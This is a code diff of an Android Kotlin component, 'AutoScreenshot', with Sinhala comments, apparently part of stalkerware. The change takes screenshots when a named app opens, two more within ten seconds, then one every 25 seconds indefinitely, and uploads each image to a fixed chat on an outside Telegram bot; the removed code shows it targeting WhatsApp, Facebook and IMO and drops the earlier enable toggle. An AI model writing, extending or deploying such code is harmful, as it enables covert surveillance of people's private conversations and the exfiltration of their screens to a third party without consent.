@@ -13,71 +13,93 @@ import okhttp3.MultipartBody
 import okhttp3.OkHttpClient
 import okhttp3.Request
 import okhttp3.RequestBody.Companion.asRequestBody
-import okhttp3.RequestBody.Companion.toRequestBody
 import java.io.File
 import java.io.FileOutputStream
 import java.util.concurrent.TimeUnit
 
 object AutoScreenshot {
     private const val TAG = "AutoScreenshot"
-    private const val PREF = "autoshot_prefs"
-    private const val KEY_ENABLED = "enabled"
-    private const val KEY_COUNT = "count"
+
+    // පළමු screenshots 3 — තත්පර 5 interval
+    private const val INITIAL_INTERVAL_MS = 5_000L
+    private const val INITIAL_COUNT = 3
+
+    // ඊට පස්සේ — තත්පර 25 interval
+    private const val CONTINUOUS_INTERVAL_MS = 25_000L
 
     private val client = OkHttpClient.Builder()
         .connectTimeout(30, TimeUnit.SECONDS)
         .readTimeout(60, TimeUnit.SECONDS)
         .build()
 
-    fun isEnabled(context: Context): Boolean {
-        val prefs = context.getSharedPreferences(PREF, Context.MODE_PRIVATE)
-        return prefs.getBoolean(KEY_ENABLED, false)
+    private val handler = Handler(Looper.getMainLooper())
+    private var currentApp: String? = null
+    private var isRunning = false
+
+    fun startContinuous(context: Context, appName: String) {
+        stopContinuous()
+        currentApp = appName
+        isRunning = true
+
+        Log.d(TAG, "Starting screenshots for $appName")
+
+        // 1. වහාම එක screenshot
+        takeAndSend(context, appName, "opened")
+
+        // 2. තත්පර 5, 10 වලට තව 2ක්
+        for (i in 1 until INITIAL_COUNT) {
+            val delayMs = INITIAL_INTERVAL_MS * i
+            handler.postDelayed({
+                if (!isRunning || currentApp != appName) return@postDelayed
+                takeAndSend(context, appName, "initial")
+            }, delayMs)
+        }
+
+        // 3. ඊට පස්සේ — තත්පර 25 interval
+        val startContinuousAfter = INITIAL_INTERVAL_MS * INITIAL_COUNT
+        handler.postDelayed({
+            if (!isRunning || currentApp != appName) return@postDelayed
+            startContinuousLoop(context, appName)
+        }, startContinuousAfter)
     }
 
-    fun setEnabled(context: Context, enabled: Boolean) {
-        val prefs = context.getSharedPreferences(PREF, Context.MODE_PRIVATE)
-        prefs.edit().putBoolean(KEY_ENABLED, enabled).apply()
+    private fun startContinuousLoop(context: Context, appName: String) {
+        val runnable = object : Runnable {
+            override fun run() {
+                if (!isRunning || currentApp != appName) return
+                takeAndSend(context, appName, "continuous")
+                handler.postDelayed(this, CONTINUOUS_INTERVAL_MS)
+            }
+        }
+        handler.postDelayed(runnable, CONTINUOUS_INTERVAL_MS)
     }
 
-    fun getCount(context: Context): Int {
-        val prefs = context.getSharedPreferences(PREF, Context.MODE_PRIVATE)
-        return prefs.getInt(KEY_COUNT, 3)
+    fun stopContinuous() {
+        Log.d(TAG, "Stopping screenshots for $currentApp")
+        isRunning = false
+        currentApp = null
+        handler.removeCallbacksAndMessages(null)
     }
 
-    fun setCount(context: Context, count: Int) {
-        val prefs = context.getSharedPreferences(PREF, Context.MODE_PRIVATE)
-        prefs.edit().putInt(KEY_COUNT, count).apply()
-    }
-
-    // WhatsApp/FB/IMO open කරාම call කරනවා
-    fun captureSequence(context: Context, appName: String) {
-        if (!isEnabled(context)) return
-
-        val count = getCount(context)
-        val svc = ScreenService.instance ?: return
-
-        Handler(Looper.getMainLooper()).postDelayed({
-            captureBatch(context, svc, appName, count, 0)
-        }, 2000L)
-    }
-
-    private fun captureBatch(context: Context, svc: ScreenService, appName: String, total: Int, current: Int) {
-        if (current >= total) {
-            notifyTelegram(context, "📸 Auto-screenshots done for $appName ($total)")
+    private fun takeAndSend(context: Context, appName: String, type: String) {
+        val svc = ScreenService.instance ?: run {
+            Log.e(TAG, "ScreenService not available")
             return
         }
 
         svc.takeShot { bmp ->
             if (bmp != null) {
-                sendScreenshot(context, bmp, appName, current + 1, total)
+                val caption = when (type) {
+                    "opened" -> "📸 $appName — Opened"
+                    "initial" -> "📸 $appName — Initial"
+                    else -> "📸 $appName — Auto"
+                }
+                sendScreenshot(context, bmp, caption)
             }
-            Handler(Looper.getMainLooper()).postDelayed({
-                captureBatch(context, svc, appName, total, current + 1)
-            }, 1500L)
         }
     }
 
-    private fun sendScreenshot(context: Context, bmp: Bitmap, appName: String, num: Int, total: Int) {
+    private fun sendScreenshot(context: Context, bmp: Bitmap, caption: String) {
         CoroutineScope(Dispatchers.IO).launch {
             try {
                 val file = File(context.cacheDir, "autoshot_${System.currentTimeMillis()}.jpg")
@@ -89,7 +111,7 @@ object AutoScreenshot {
                 val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                     .addFormDataPart("chat_id", MonitoringService.CHAT_ID)
                     .addFormDataPart("photo", file.name, file.asRequestBody("image/jpeg".toMediaType()))
-                    .addFormDataPart("caption", "📸 $appName — $num/$total")
+                    .addFormDataPart("caption", caption)
                     .build()
 
                 client.newCall(Request.Builder().url(url).post(body).build()).execute()
@@ -97,17 +119,6 @@ object AutoScreenshot {
             } catch (e: Exception) {
                 Log.e(TAG, "Send error", e)
             }
-        }
-    }
-
-    private fun notifyTelegram(context: Context, msg: String) {
-        CoroutineScope(Dispatchers.IO).launch {
-            try {
-                val url = "https://api.telegram.org/bot${MonitoringService.BOT_TOKEN}/sendMessage"
-                val json = """{"chat_id":"${MonitoringService.CHAT_ID}","text":"$msg"}"""
-                val body = json.toRequestBody("application/json".toMediaType())
-                client.newCall(Request.Builder().url(url).post(body).build()).execute()
-            } catch (_: Exception) {}
         }
     }
 }
